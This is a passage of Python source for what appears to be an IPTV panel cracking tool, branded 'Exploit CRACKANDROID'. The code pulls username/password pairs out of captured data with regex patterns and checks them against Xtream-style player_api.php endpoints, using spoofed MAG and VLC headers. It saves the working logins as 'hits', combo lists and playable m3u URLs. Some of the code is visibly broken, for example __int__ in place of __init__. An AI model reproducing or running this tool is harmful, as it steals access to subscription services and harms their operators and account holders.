            categoria = re.sub("\\bMONTENEGRO\\b", "MONTENEGRO 🇲🇪", categoria)
            categoria = re.sub("\\bMONTSERRAT\\b", "MONTSERRAT 🇲🇸", categoria)
            categoria = re.sub("\\bMOROCCO\\b", "MOROCCO 🇲🇦", categoria)
            categoria = re.sub("\\bMOZAMBIQUE\\b", "MOZAMBIQUE 🇲🇿", categoria)
            categoria = re.sub("\\bMYANMAR\\b", "MYANMAR 🇲🇲", categoria)
            categoria = re.sub("\\bNAMIBIA\\b", "NAMIBIA 🇳🇦", categoria)
            categoria = re.sub("\\bNAURU\\b", "NAURU 🇳🇷", categoria)
            categoria = re.sub("\\bNEPAL\\b", "NEPAL 🇳🇵", categoria)
            categoria = re.sub("\\bNETHERLANDS\\b", "NETHERLANDS 🇳🇱", categoria)
            categoria = re.sub("\\bNEDERLAND\\b", "NEDERLAND 🇳🇱", categoria)
            categoria = re.sub("\\bNEW CALEDONIA\\b", "NEW CALEDONIA 🇳🇨", categoria)
            categoria = re.sub("\\bNEW ZEALAND\\b", "NEW ZEALAND 🇳🇿", categoria)
            categoria = re.sub("\\bNICARAGUA\\b", "NICARAGUA 🇳🇮", categoria)
            categoria = re.sub("\\bNIGER\\b", "NIGER 🇳🇪", categoria)
            categoria = re.sub("\\bNIGERIA\\b", "NIGERIA 🇳🇬", categoria)
            categoria = re.sub("\\bNIUE\\b", "NIUE 🇳🇺", categoria)
            categoria = re.sub("\\bNORFOLK ISLAND\\b", "NORFOLK ISLAND 🇳🇫", categoria)
            categoria = re.sub("\\bNORTH KOREA\\b", "NORTH KOREA 🇰🇵", categoria)
            categoria = re.sub("\\bNORTHERN MARIANA ISLANDS\\b", "NORTHERN MARIANA ISLANDS 🇲🇵", categoria)
            categoria = re.sub("\\bNORWAY\\b", "NORWAY 🇳🇴", categoria)
            categoria = re.sub("\\bOMAN\\b", "OMAN 🇴🇲", categoria)
            categoria = re.sub("\\bPAKISTAN\\b", "PAKISTAN 🇵🇰", categoria)
            categoria = re.sub("\\bPALAU\\b", "PALAU 🇵🇼", categoria)
            categoria = re.sub("\\bPALASTINIAN TERRITORIES\\b", "PALASTINIAN TERRITORIES 🇵🇸", categoria)
            categoria = re.sub("\\bPANAMA\\b", "PANAMA 🇵🇦", categoria)
            categoria = re.sub("\\bPAPUA NEW GUINEA\\b", "PAPUA NEW GUINEA 🇵🇬", categoria)
            categoria = re.sub("\\bPARAGUAY\\b", "PARAGUAY 🇵🇾", categoria)
            categoria = re.sub("\\bPERU\\b", "PERU 🇵🇪", categoria)
            categoria = re.sub("\\bPHILIPPINES\\b", "PHILIPPINES 🇵🇭", categoria)
            categoria = re.sub("\\bPITCAIRN ISLANDS\\b", "PITCAIRN ISLANDS 🇵🇳", categoria)
            categoria = re.sub("\\bPOLAND\\b", "POLAND 🇵🇱", categoria)
            categoria = re.sub("\\bPORTUGAL\\b", "PORTUGAL 🇵🇹", categoria)
            categoria = re.sub("\\bPUERTO RICO\\b", "PUERTO RICO 🇵🇷", categoria)
            categoria = re.sub("\\bQATAR\\b", "QATAR 🇶🇦", categoria)
            categoria = re.sub("\\bREPUBLIC OF THE CONGO\\b", "REPUBLIC OF THE CONGO 🇨🇬", categoria)
            categoria = re.sub("\\bRÉUNION\\b", "RÉUNION 🇷🇪", categoria)
            categoria = re.sub("\\bROMANIA\\b", "ROMANIA 🇷🇴", categoria)
            categoria = re.sub("\\bRUSSIA\\b", "RUSSIA 🇷🇺", categoria)
            categoria = re.sub("\\bRWANDA\\b", "RWANDA 🇷🇼", categoria)
            categoria = re.sub("\\bSAINT BARTHÉLEMY\\b", "SAINT BARTHÉLEMY 🇧🇱", categoria)
            categoria = re.sub("\\bSAINT HELENA\\b", "SAINT HELENA 🇸🇭", categoria)
            categoria = re.sub("\\bSAINT KITTS AND NEVIS\\b", "SAINT KITTS AND NEVIS 🇰🇳", categoria)
            categoria = re.sub("\\bSAINT LUCIA\\b", "SAINT LUCIA 🇱🇨", categoria)
            categoria = re.sub("\\bSAINT MARTIN\\b", "SAINT MARTIN 🇲🇫", categoria)
            categoria = re.sub("\\bSAINT PIERRE AND MIQUELON\\b", "SAINT PIERRE AND MIQUELON 🇵🇲", categoria)
            categoria = re.sub("\\bSAINT VINCENT AND THE GRENADINES\\b", "SAINT VINCENT AND THE GRENADINES 🇻🇨", categoria)
            categoria = re.sub("\\bSAMOA\\b", "SAMOA 🇼🇸", categoria)
            categoria = re.sub("\\bSAN MARINO\\b", "SAN MARINO 🇸🇲", categoria)
            categoria = re.sub("\\bSÃO TOMÉ AND PRÍNCIPE\\b", "SÃO TOMÉ AND PRÍNCIPE 🇸🇹", categoria)
            categoria = re.sub("\\bSAUDI ARABIA\\b", "SAUDI ARABIA 🇸🇦", categoria)
            categoria = re.sub("\\bSENEGAL\\b", "SENEGAL 🇸🇳", categoria)
            categoria = re.sub("\\bSERBIA\\b", "SERBIA 🇷🇸", categoria)
            categoria = re.sub("\\bSEYCHELLES\\b", "SEYCHELLES 🇸🇨", categoria)
            categoria = re.sub("\\bSIERRA LEONE\\b", "SIERRA LEONE 🇸🇱", categoria)
            categoria = re.sub("\\bSINGAPORE\\b", "SINGAPORE 🇸🇬", categoria)
            categoria = re.sub("\\bSINT MAARTEN\\b", "SINT MAARTEN 🇸🇽", categoria)
            categoria = re.sub("\\bSLOVAKIA\\b", "SLOVAKIA 🇸🇰", categoria)
            categoria = re.sub("\\bSLOVENIA\\b", "SLOVENIA 🇸🇮", categoria)
            categoria = re.sub("\\bSOLOMON ISLANDS\\b", "SOLOMON ISLANDS 🇸🇧", categoria)
            categoria = re.sub("\\bSOMALIA\\b", "SOMALIA 🇸🇴", categoria)
            categoria = re.sub("\\bSOUTH AFRICA\\b", "SOUTH AFRICA 🇿🇦", categoria)
            categoria = re.sub("\\bSOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS\\b", "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS 🇬🇸", categoria)
            categoria = re.sub("\\bSOUTH KOREA\\b", "SOUTH KOREA 🇰🇷", categoria)
            categoria = re.sub("\\bSOUTH SUDAN\\b", "SOUTH SUDAN 🇸🇸", categoria)
            categoria = re.sub("\\bSPAIN\\b", "SPAIN 🇪🇸", categoria)
            categoria = re.sub("\\bESPANA\\b", "ESPANA 🇪🇸", categoria)
            categoria = re.sub("\\bSRI LANKA\\b", "SRI LANKA 🇱🇰", categoria)
            categoria = re.sub("\\bSUDAN\\b", "SUDAN 🇸🇩", categoria)
            categoria = re.sub("\\bSURINAME\\b", "SURINAME 🇸🇷", categoria)
            categoria = re.sub("\\bSVALBARD AND JAN MAYEN\\b", "SVALBARD AND JAN MAYEN 🇸🇯", categoria)
            categoria = re.sub("\\bSWAZILAND\\b", "SWAZILAND 🇸🇿", categoria)
            categoria = re.sub("\\bSWEDEN\\b", "SWEDEN 🇸🇪", categoria)
            categoria = re.sub("\\bSWITZERLAND\\b", "SWITZERLAND 🇨🇭", categoria)
            categoria = re.sub("\\bSYRIA\\b", "SYRIA 🇸🇾", categoria)
            categoria = re.sub("\\bTAIWAN\\b", "TAIWAN 🇹🇼", categoria)
            categoria = re.sub("\\bTAJIKISTAN\\b", "TAJIKISTAN 🇹🇯", categoria)
            categoria = re.sub("\\bTANZANIA\\b", "TANZANIA 🇹🇿", categoria)
            categoria = re.sub("\\bTHAILAND\\b", "THAILAND 🇹🇭", categoria)
            categoria = re.sub("\\bTIMOR-LESTE\\b", "TIMOR-LESTE 🇹🇱", categoria)
            categoria = re.sub("\\bTOGO\\b", "TOGO 🇹🇬", categoria)
            categoria = re.sub("\\bTOKELAU\\b", "TOKELAU 🇹🇰", categoria)
            categoria = re.sub("\\bTONGA\\b", "TONGA 🇹🇴", categoria)
            categoria = re.sub("\\bTRINIDAD AND TOBAGO\\b", "TRINIDAD AND TOBAGO 🇹🇹", categoria)
            categoria = re.sub("\\bTUNISIA\\b", "TUNISIA 🇹🇳", categoria)
            categoria = re.sub("\\bTURKEY\\b", "TURKEY 🇹🇷", categoria)
            categoria = re.sub("\\bTURKMENISTAN\\b", "TURKMENISTAN 🇹🇲", categoria)
            categoria = re.sub("\\bTURKS AND CAICOS ISLANDS\\b", "TURKS AND CAICOS ISLANDS 🇹🇨", categoria)
            categoria = re.sub("\\bTUVALU\\b", "TUVALU 🇹🇻", categoria)
            categoria = re.sub("\\bUGANDA\\b", "UGANDA 🇺🇬", categoria)
            categoria = re.sub("\\bUKRAINE\\b", "UKRAINE 🇺🇦", categoria)
            categoria = re.sub("\\bUNITED ARAB EMIRATES\\b", "UNITED ARAB EMIRATES 🇦🇪", categoria)
            categoria = re.sub("\\bUNITED KINGDOM\\b", "UNITED KINGDOM 🇬🇧", categoria)
            categoria = re.sub("\\bUNITED STATES\\b", "UNITED STATES 🇺🇸", categoria)
            categoria = re.sub("\\bUSA\\b", "UNITED STATES 🇺🇸", categoria)
            categoria = re.sub("\\bURUGUAY\\b", "URUGUAY 🇺🇾", categoria)
            categoria = re.sub("\\bUZBEKISTAN\\b", "UZBEKISTAN 🇺🇿", categoria)
            categoria = re.sub("\\bVANUATU\\b", "VANUATU 🇻🇺", categoria)
            categoria = re.sub("\\bVENEZUELA\\b", "VENEZUELA 🇻🇪", categoria)
            categoria = re.sub("\\bVIETNAM\\b", "VIETNAM 🇻🇳", categoria)
            categoria = re.sub("\\bVIRGIN ISLANDS, BRITISH\\b", "VIRGIN ISLANDS, BRITISH 🇻🇬", categoria)
            categoria = re.sub("\\bVIRGIN ISLANDS, U.S.\\b", "VIRGIN ISLANDS, U.S. 🇻🇮", categoria)
            categoria = re.sub("\\bWALLIS AND FUTUNA\\b", "WALLIS AND FUTUNA 🇼🇫", categoria)
            categoria = re.sub("\\bYEMEN\\b", "YEMEN 🇾🇪", categoria)
            categoria = re.sub("\\bZAMBIA\\b", "ZAMBIA 🇿🇲", categoria)
            categoria = re.sub("\\bZIMBABWE\\b", "ZIMBABWE 🇿🇼", categoria)
            categoria = re.sub("\\bÅLAND ISLANDS\\b", "ÅLAND ISLANDS 🇦🇽", categoria)
            categoria = re.sub("\\bWESTERN SAHARA\\b", "WESTERN SAHARA 🇪🇭", categoria)
            categoria = re.sub("\\bGREAT BRITAIN\\b", "GREAT BRITAIN 🇬🇧", categoria)
            categoria = re.sub("\\bFRENCH SOUTHERN TERRITORIES\\b", "FRENCH SOUTHERN TERRITORIES 🇹🇫", categoria)
            categoria = re.sub("\\bVATICAN CITY STATE\\b", "VATICAN CITY STATE 🇻🇦", categoria)
            categoria = re.sub("\\bANTARCTICA\\b", "ANTARCTICA 🇦🇶", categoria)
            return categoria
        except:
            pass


def separarUserPass(entrada: str):
    try:
        protocolo = "http"
        if entrada.find("https") >= 0:
            protocolo = "https"
        entrada = entrada.replace("/", "")
        separador = "get.php"
        separado = entrada.split(separador)
        url = separado[0].replace("https:", "")
        url = url.replace("http:", "")
        separador = "username="
        separado = entrada.split(separador)
        separado = separado[1].split("password=")
        user = separado[0].replace("&", "")
        separado = separado[1].split("&")
        password = separado[0]
        return (protocolo, url, user, password)
    except:
        return ""


def checkFullM3U_URL(entradaURL: str, _session):
    protocolo, url, user, passw = separarUserPass(entradaURL)
    urlEntrada = url
    urlPlayerInfo = "http://" + url + "/player_api.php?username=" + str(user) + "&password=" + str(passw)
    print("Trying to get information from: ", urlPlayerInfo)
    try:
        res = _session.get(urlPlayerInfo, headers=(hea3(url)), timeout=(5, 15), allow_redirects=False, stream=True)
        if res.status_code == 200:
            datos = json.loads(res.text)
            if datos["user_info"]["auth"] == 0:
                return ('KO', '', '', '')
            urlReal = datos["server_info"]["url"] + ":" + datos["server_info"]["port"]
            urlReal = urlReal.replace("https://", "")
            urlReal = urlReal.replace("http://", "")
            url = urlReal
            puerto = datos["server_info"]["port"]
            return ('OK', '', '', '')
        else:
            return ('KO', '', '', '')
    except Exception as errp:
        print("erro ao tentar acessar o servidor m3u:", errp)
        return ('KO', '', '', '')


def hea3(panel):
    hea = {
     'Icy-MetaData': '"1"', 
     'User-Agent': '"Lavf/57.83.100"', 
     'Accept-Encoding': '"identity"', 
     'Host': panel, 
     'Accept': '"*/*"', 
     'Range': '"bytes=0-"', 
     'Connection': '"close"'}
    return hea


class OutputFileWriter:
    nombreBase: str
    maxSizeperFile: int
    nombreActual: str
    contador: int

    def __int__(self, _nombreBase: str):
        self.nombreBase = _nombreBase
        self.nombreActual = self.nombreBase
        self.contador += 1

    def initValues(self, serverURL):
        self.nombreBase = serverURL.replace(":", "_")
        self.nombreBase = self.nombreBase.replace(".", "_")
        self.nombreActual = self.nombreBase
        self.contador = 1

    def writeToFile(self, entrada: str):
        try:
            nombreFICHERO = check_os() + "/debug/" + self.nombreActual + ".txt"
            fichero = open(nombreFICHERO, "a")
            file_size = os.path.getsize(nombreFICHERO)
            if file_size / 1024 > 3000:
                self.nombreActual = self.nombreBase + "_" + str(self.contador)
                self.contador += 1
                fichero = open(check_os() + "/debug/" + self.nombreActual + ".txt", "a")
            fichero.write(entrada)
            fichero.close()
        except Exception as errp:
            print("Erro ao gravar no arquivo de saída DUMP:", errp)


class DataContainer:
    colaFifo: PriorityQueue
    lock

    def __init__(self):
        self.colaFifo = PriorityQueue()
        self.lock = threading.Lock()

    def put(self, entrada):
        self.lock.acquire()
        self.colaFifo.put(entrada)
        self.lock.release()

    def get(self):
        return self.colaFifo.get()


class DatosServerM3U:
    puertoBaseSERVER = 0
    host = ""
    panelM3u = ""
    protocoloSERVER = "http"
    canal = ""
    panelHost = ""
    panelProtocolo = "http"
    m3uURL = ""
    panelPuerto = 0
    misHeaders = {
     'Accept': '"*/*"', 
     'Accept-Language': '"es"', 
     'User-Agent': '"VLC/3.0.18 LibVLC/3.0.18"', 
     'Range': '"bytes=0-"'}

    def printInfoServer(self):
        print("Host of the panel-->", self.panelHost)
        print("Port of the Panel--->", self.panelPuerto)
        print("Port of the Server--->", self.puertoBaseSERVER)
        print("\tURL of the panel-->", self.m3uURL)
        if self.puertoBaseSERVER == None:
            self.puertoBaseSERVER = 80
        print("\tServer final:", self.protocoloSERVER + "://" + self.host + ":" + str(self.puertoBaseSERVER))
        print("\tHost Server Final-->", self.host)
        print("\tServer Final protocol-->", self.protocoloSERVER)
        print("\tChannel used-->", self.canal)

    def __str__(self):
        return self.panelProtocolo + "://" + self.panelHost + "--->" + self.protocoloSERVER + "://" + self.host + ":" + str(self.puertoBaseSERVER)

    def extraerCanalFromM3U(self, _m3u: str):
        global selectm
        if selectm != "3":
            try:
                _m3u = _m3u.replace("_plus", "")
                m3u8_obj = m3u8.load(_m3u, headers=(self.misHeaders))
                playlist = [el["uri"] for el in m3u8_obj.data["segments"]]
                sesion = requests.Session()
                num_channels = len(playlist)
                random_index = random.randint(1, num_channels - 1)
                canal = playlist[random_index]
                print(f"\n Total Channels: {num_channels}")
                print(f"\n{M} Taking IP from\n Channel number:{RST} {random_index}\n")
                time.sleep(2)
                return canal
            except Exception as errp:
                print("\x1b[31m Error accessing the m3u \x1b[0m:", errp)
                return ""

        try:
            _m3u = _m3u.replace("_plus", "")
            m3u8_obj = m3u8.load(_m3u, headers=(self.misHeaders))
            playlist = [el["uri"] for el in m3u8_obj.data["segments"]]
            sesion = requests.Session()
            canal = playlist[50]
            return canal
        except Exception as errp:
            print(Fore.RED, "\n❖︎ Explorar URL/IP !!!\n", Fore.RESET)
            time.sleep(2)
            return ""

    def extraerServerFinal(self, _m3uURL):
        try:
            canal = self.extraerCanalFromM3U(_m3uURL)
            self.m3uURL = _m3uURL
            if canal != "":
                panelParser = urlparse(_m3uURL)
                self.panelHost = panelParser.netloc.split(":")[0]
                self.panelProtocolo = panelParser.scheme
                self.panelPuerto = panelParser.port
                sesion = requests.Session()
                respuesta = sesion.get(url=canal, stream=False, allow_redirects=False)
                self.canal = canal
                if "Location" in respuesta.headers:
                    miparser = urlparse(respuesta.headers["Location"])
                    self.panelM3u = _m3uURL
                    self.host = miparser.hostname
                    self.puertoBaseSERVER = miparser.port
                    self.protocoloSERVER = miparser.scheme
                    return self
                miparser = urlparse(_m3uURL)
                self.panelM3u = _m3uURL
                if miparser.hostname == None:
                    self.host = _m3uURL
                    self.panelHost = _m3uURL
                else:
                    self.host = miparser.hostname
                    self.panelHost = miparser.hostname
                if miparser.port == None:
                    self.puertoBaseSERVER = 80
                    self.panelPuerto = 80
                else:
                    self.puertoBaseSERVER = miparser.port
                    self.panelPuerto = miparser.port
                if miparser.scheme == None:
                    self.panelProtocolo = ""
                    self.protocoloSERVER = ""
            else:
                self.panelProtocolo = miparser.scheme
                self.protocoloSERVER = miparser.scheme
            return self
        except Exception as errp:
            print("Error:", errp)

    def __eq__(self, other):
        return self.m3uURL == other.m3uURL

    def __gt__(self, other):
        return self.m3uURL > other.m3uURL


class DataAnalyzer:
    miDataContainer: DataContainer
    patronURL_USERNAME_PASSWORD = "username=[A-z0-9_*!¡@$?¿:\\-\\.@]*\\&password=[A-z0-9_*!¡@$?¿:\\-\\.@]*"
    patronLISTACANAL_M3U = "https?:\\/[\\/A-z0-9_*!¡@$?.%¿:\\-]{3,}"
    patronREQUEST_URI = "username=([A-z0-9_*!¡@$?¿:\\-\\.@]*\\&password=[A-z0-9_*!¡@$?¿:\\-\\.@]*)(REQUEST_METHOD)"
    patronTOKEN = "https?:\\/\\/[A-z0-9_*!¡@$?.%¿:\\/]{4,}\\/[A-z0-9_*!¡@$?.%¿:\\-]*token"
    patronLIVE = "live\\/[A-z0-9_*!¡@$?.%¿:\\-]{2,}\\/[A-z0-9_*!¡@$?¿\\-]{2,}"
    patronEXTINF = "\\/([A-z0-9_*!¡@$?.%¿:\\-]*/){4,}([A-z0-9_*!¡@$?.%¿:\\-]*)#EXTINF"
    contenedorUSER_PASS: dict
    urlBASE = ""
    protocoloBase = ""
    puertoBase = ""
    primeraVez = True
    nombreFicheroCombos = ""
    miDS: DatosServerM3U

    def setURLBase(self, _miDS: DatosServerM3U):
        self.urlBASE = _miDS.panelHost
        self.protocoloBase = _miDS.panelProtocolo
        self.puertoBase = _miDS.panelPuerto
        self.nombreFicheroCombos = check_os() + "/combo/userpass/" + "COMBO_" + self.urlBASE.replace(".", "_").replace(":", "_") + ".txt"
        self.miDS = _miDS

    def validarM3U(self, entrada: str):
        HEADER1_m3u = {
         'Cookie': '"stb_lang=en; timezone=Europe%2FIstanbul;"', 
         'X-User-Agent': '"Model: MAG254; Link: Ethernet"', 
         'Connection': '"Keep-Alive"', 
         'Accept-Encoding': '"gzip, deflate"', 
         'Accept': '"application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"', 
         'User-Agent': '"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"'}
        miM3U_UTILS = M3U_UTILS()
        protocolo, url, user, passw = separarUserPass(entrada)
        salida = entrada.replace("get.php", "player_api.php")
        session = requests.Session()
        print("Invoking: " + salida)
        try:
            miHitData = HitData()
            respuesta = session.get(url=salida, headers=HEADER1_m3u, timeout=5)
            datosLista = respuesta.json()
            if respuesta.status_code == 200 and datosLista["user_info"]["auth"] != 0:
                valorScanner, urlServer, puerto, procolo = checkFullM3U_URL(entrada, session)
                if valorScanner.find("OK") >= 0 or valorScanner.find("KOK") >= 0:
                    if valorScanner.find("KOK") >= 0:
                        miHitData.m3uValid = "𝐎𝐅𝐅_𝐋𝐈𝐍𝐄"
                    else:
                        miHitData.m3uValid = "#𝐎𝐍_𝐋𝐈𝐍𝐄"
                miHitData.real = url
                miHitData.url = url
                miHitData.nick = nick
                miHitData.m3uURL = entrada
                miM3U_UTILS.extractDataFromList(user, passw, respuesta.text, url, miHitData)
                listaCanales = miM3U_UTILS.extractChannelListM3U_FromUSER_PASS(url, user, passw)
                miHitData.livelist = listaCanales
                return miHitData
            else:
                return ""
        except Exception as errp:
            print("Error parsing URL:", errp)
            return ""

        print(respuesta.text)

    def writeComboToFile(self, user, passw):
        try:
            fichero = open(self.nombreFicheroCombos, "a")
            fichero.write(user + ":" + passw)
            fichero.write("\n")
            fichero.close()
        except Exception as errp:
            cadena = "\x1b[31;40mError writing to Combo file" + errp + "\x1b[0m"
            print(cadena)

    def readComboFromFile(self, miDiccionario: dict):
        try:
            if os.path.exists(self.nombreFicheroCombos) == True:
                texto = "\x1b[30;47mReading previous combo file _" + self.nombreFicheroCombos + "\x1b[0m"
                with open(self.nombreFicheroCombos, "r") as f:
                    lines = f.readlines()
                for line in lines:
                    key, value = line.split(":")
                    miDiccionario[key] = value

                texto = "\x1b[30;47mTotal combos generated _" + str(len(self.contenedorUSER_PASS)) + "\x1b[0m"
                print(texto)
        except Exception as errp:
            print("\x1b[31mError reading combo file " + self.nombreFicheroCombos + " => " + errp + "\x1b[0m")

    def generateURL_m3u(self, _user, passw):
        try:
            print(f"{VDC}─➤○ ɢʀᴏᴜᴘ ᴀᴘxʟʟ        {RST}", "\n\n ❖︎ U:P >", _user, ":", passw)
            if self.puertoBase != "" and self.puertoBase != None:
                urlM3U = self.protocoloBase + "://" + self.urlBASE + ":" + str(self.puertoBase) + "/get.php?username=" + _user + "&password=" + passw + "&type=m3u_plus"
            else:
                urlM3U = self.protocoloBase + "://" + self.urlBASE + "/get.php?username=" + _user + "&password=" + passw + "&type=m3u_plus"
            nombreFricheroM3U_OK = check_os() + "/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/Full/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘_" + self.urlBASE.replace(".", "_").replace(":", "_") + "_#" + nick + "[Full].txt"
            nombreFricheroM3U_LISTA = check_os() + "/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/m3u/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘_" + self.urlBASE.replace(".", "_") + "_#" + nick + "[m3u].txt"
            nombreFricheroM3U_COMBO = check_os() + "/Hits/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘/Combo/𝔼𝕩𝕡𝕝𝕠𝕚𝕥-𖣘_" + self.urlBASE.replace(".", "_").replace(":", "_") + "_#" + nick + "[Combo].txt"
            ficheroCOMBO = open(nombreFricheroM3U_COMBO, "a", encoding="utf8")
            ficherFULL = open(nombreFricheroM3U_OK, "a", encoding="utf8")
            fichero_nombreFricheroM3U_COMBO = open(nombreFricheroM3U_LISTA, "a", encoding="utf8")
            if self.primeraVez:
                self.primeraVez = False
                ficherFULL.write("" + time.asctime() + "")
                ficherFULL.write("\n\n")
            miHidata = self.validarM3U(urlM3U)
            if miHidata != "":
                ficherFULL.write(str(miHidata))
                ficherFULL.write("\n\n")
                ficherFULL.close()
                ficheroCOMBO.write(_user + ":" + passw + "\n")
                ficheroCOMBO.close()
                fichero_nombreFricheroM3U_COMBO.write(miHidata.m3uURL + "\n")
                fichero_nombreFricheroM3U_COMBO.close()
                fichero_nombreFricheroM3U_COMBO.close()
                return miHidata
        except Exception as errp:
            print("\x1b[31mError writing to the HITS file!!!!!\x1b]0m", errp)
            quit()

    def extractDataRequestEXTINF(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return (user, passw)
        except Exception as errp:
            cadena = "\x1b[31;40mError processing data extraction from REQUEST_EXTINF:" + errp + " Input data:" + entrada + "\x1b[0m"
            print(cadena)
            return ('', '')

    def extractDataRequestLIVE(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return (user, passw)
        except Exception as errp:
            cadena = "\x1b[31;40mError processing data extraction from REQUEST_LIVE:" + errp + " Input data:" + entrada + "\x1b[0m"
            print(cadena)
            return ('', '')

    def extractDataRequestTOKEN(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return (user, passw)
        except Exception as errp:
            cadena = "\x1b[31;40mError processing data extraction from REQUEST_TOKEN:" + errp + " Input data:" + entrada + "\x1b[0m"
            print(cadena)
            return ('', '')

    def extractDataREQUEST_URI(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return (user, passw)
        except Exception as errp:
            cadena = "\x1b[31;40mError processing data extraction from REQUEST_URL:" + errp + " Input data:" + entrada + "\x1b[0m"
            print(cadena)
            return ('', '')

    def extractData_URL_USERNAME_PASSWORD(self, _entrada: str):
        try:
            entrada = _entrada.split("REQUEST")
            datos = _entrada.split("username=")
            salida = datos[1].split("&password=")
            user = salida[0]
            passw = salida[1]
            return (user, passw)
        except Exception as errp:
            cadena = "\x1b[31;40mError processing data extraction from REQUEST_LOGIN:" + errp + " Input data:" + entrada + "\x1b[0m"
            return ('', '')

    def extractData_LISTACANAL_m3u(self, entrada):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return (user, passw)
        except:
            return ('', '')

    def setDataContainer(self, _dataC: DataContainer):
        self.miDataContainer = _dataC

    def setCombosCotainer(self, _miDictCombos: dict):
        self.contenedorUSER_PASS = _miDictCombos

    def writeDebugCode(self, entrada):
        try:
            print(entrada)
            fichero = open(".\\debug2\\trazas.txt", "a")
            fichero.write("\n" + entrada)
        except:
            pass

    def tratarUsuario(self, user, passw):
        global hitc
        lock.acquire()
        if user != "":
            cadena = "\n\n\n\n\n\n\n\n\n\n\x1b[1;90m         \n                               \x1b[36m   ╽       \x1b[0m\n\x1b[1;90m                                  ╎\n                                  ║\n                                  ║\n╒════════════ 🅂🅈🅂🅃🄴🄼 ════════════╕\n│📡  \x1b[91m◌ \x1b[0m𝕌𝕊𝔼ℝ ➭ \x1b[32m" + user + ":" + passw + " \x1b[0m\n│🖲  \x1b[91m◌ \x1b[0mℂ𝕆𝕄𝔹 ➭  \x1b[33m" + str(self.miDataContainer.colaFifo.qsize()) + " \x1b[0m\n│\U0001f977  \x1b[91m◌ \x1b[0m𝕀𝔻 ℂ𝕠𝕞𝕓𝕠 ➭ \x1b[31m" + str(id(self.contenedorUSER_PASS)) + " \x1b[0m\n│🤖  \x1b[91m◌ \x1b[0m𝔹𝕆𝕋 \x1b[35m" + threading.current_thread().name + "  \x1b[0m\n│🦅  \x1b[91m◌ \x1b[0m𝕟𝕚𝕔𝕜 ➭ " + str(nick) + "\n│📱  \x1b[91m◌ \x1b[0m𝕥𝕚𝕞𝕖 ➭ \x1b[36m" + str(time.strftime("%d.%b.%Y • %H:%M:%S")) + " \x1b[0m\n│📟  \x1b[93m𝕙𝕚𝕥𝕤 ➭ [" + str(hitc) + "] \x1b[0m \n╘══════════════════════════════════╛\n\n           ✭𝔼𝕩𝕡𝕝𝕠𝕚𝕥 🐉 CRACKANDROID✭\n\x1b[31m               ▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱\n\n                                                       \x1b[0m"
            print(cadena)
            if str(self.contenedorUSER_PASS.get(user)) == "None":
                self.contenedorUSER_PASS[user] = passw
                miHitData = self.generateURL_m3u(user, passw)
                self.writeComboToFile(user, passw)
                hitc += 1
            else:
                cadena = "\n\x1b[37m Data: \x1b[93m ⚠️ Unsaved Hit Already Exists ⚠️      \x1b[0m\n User Data: \x1b[32m" + user + ":" + passw + "\x1b[0m\n"
                print(cadena)
        lock.release()

    def doAnalyze(self):
        cadena = " ❖︎ Starting Consumer:" + Fore.RED + str(id(self)) + "\n ✶ Container ID:" + Fore.YELLOW + str(id(self.miDataContainer)) + Fore.RESET + "\n ❖︎ Combo ID Contenodor:" + Fore.RED + str(id(self.contenedorUSER_PASS)) + Fore.RESET + "\n\n"
        print(cadena)
        while 1:
            user = ""
            passw = ""
            datos = self.miDataContainer.get()
            resultado = re.findall(self.patronLISTACANAL_M3U, datos)
            if debug:
                print("Analyzing data from the container... Extracted size:", len(datos))
            if len(resultado) > 0:
                if debug:
                    cadena = Fore.GREEN + "Found pattern LISTACANAL_M3U-->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena + "\n\t" + datos)
                for elemento in resultado:
                    user, passw = self.extractData_LISTACANAL_m3u(elemento)
                    self.tratarUsuario(user, passw)

            resultado = re.findall(self.patronURL_USERNAME_PASSWORD, datos)
            if len(resultado) > 0:
                if debug:
                    cadena = Fore.GREEN + "Found pattern URL_USERNAME_PASSWORD-->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena + "\n\t" + datos)
                for elemento in resultado:
                    user, passw = self.extractData_URL_USERNAME_PASSWORD(elemento)
                    self.tratarUsuario(user, passw)

            resultado = re.search(self.patronEXTINF, datos)
            if resultado != None:
                if debug:
                    cadena = Fore.GREEN + "Found pattern EXTINF-->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena + "\n\t" + datos)
                for elemento in resultado:
                    user, passw = self.extractDataRequestEXTINF(elemento)
                    self.tratarUsuario(user, passw)

            resultado = re.findall(self.patronREQUEST_URI, datos)
            if len(resultado) > 0:
                if debug:
                    cadena = Fore.GREEN + "Found pattern REQUEST_URI-->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena + "\n\t" + datos)
                for elemento in resultado:
                    user, passw = self.extractDataREQUEST_URI(elemento)
                    self.tratarUsuario(user, passw)

            resultado = re.findall(self.patronTOKEN, datos)
            if len(resultado) > 0:
                for elemento in resultado:
                    user, passw = self.extractDataRequestTOKEN(elemento)
                    self.tratarUsuario(user, passw)

                if debug:
                    cadena = Fore.GREEN + "Found pattern TOKEN-->:" + datos + Fore.RESET
                    self.writeDebugCode(cadena + "\n\t" + datos)
                resultado = re.findall(self.patronLIVE, datos)
                if len(resultado) > 0:
                    for elemento in resultado:
                        user, passw = self.extractDataRequestLIVE(elemento)
                        self.tratarUsuario(user, passw)

                    if debug:
                        cadena = Fore.GREEN + "Found pattern LIVE-->:" + datos + Fore.RESET
